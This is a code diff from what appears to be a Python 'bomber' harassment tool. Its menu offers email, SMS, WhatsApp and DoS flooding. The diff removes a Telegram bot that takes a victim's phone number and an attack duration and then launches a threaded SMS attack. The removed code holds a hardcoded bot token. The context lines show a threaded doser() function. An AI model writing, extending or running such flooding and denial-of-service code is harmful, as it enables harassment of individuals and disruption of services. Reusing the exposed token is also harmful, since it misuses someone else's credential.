@@ -384,51 +384,6 @@ def doser():
 			thr = Thread(target=send)
 			thr.start()
 
-
-def tbot():
-	bot = telebot.TeleBot('1613989062:AAEyCUWtYYS63O71zUtHPJRETSzBPs1JJF4')
-
-	@bot.message_handler(commands=['help'])
-	def start(message):
-	    help = 'To start SMS Bomber type /bomber'
-	    bot.send_message(message.chat.id, help)
-
-	number = ''
-	time = 0
-	@bot.message_handler(content_types=['text'])
-	def start(message):
-	    if message.text == '/bomber':
-	        bot.send_message(message.from_user.id, 'Enter target number with +7')
-	        bot.register_next_step_handler(message, get_number)
-	    else:
-	        bot.send_message(message.from_user.id, 'Type /bomber or /help')
-
-
-	def get_number(message):
-	    global number
-	    number = message.text
-	    bot.send_message(message.from_user.id, 'Enter attack time (in seconds)')
-	    bot.register_next_step_handler(message, get_time)
-
-
-	def get_time(message):
-	    global time
-	    time = message.text
-	    time_integer = int(time)
-	    time = time_integer
-	    main()
-
-
-	def main():
-	    threads = 4
-	    from SMS.main import SMS_ATTACK
-	    SMS_ATTACK(threads, time, number)
-
-	try: 
-	    bot.polling(none_stop=True, interval=0)
-	except:
-	    pass
-
 def pb():
 	toolbar_width = 40
 
@@ -455,8 +410,7 @@ print('''
 	┃1-Email bomber         ┃
 	┃2-Sms bomber           ┃
 	┃3-WhatsApp bomber      ┃
-	┃4-Telegram sms bomber  ┃
-	┃5-Dos bomber           ┃
+	┃4-Dos bomber           ┃          
 	╰━━━━━━━━━━━━━━━━━━━━━━━╯
 	''')
 ans=int(input(">> "))
@@ -468,10 +422,6 @@ elif ans==2:
 elif ans==3:
 	wbomber()
 elif ans==4:
-	print("Open bot in telegram: https://t.me/HaipanemNemnozechko_bot")
-	print("The bot is running, do not close the program")
-	tbot()
-elif ans==5:
 	doser()
 else:
 	print("ERROR: Invalid value")
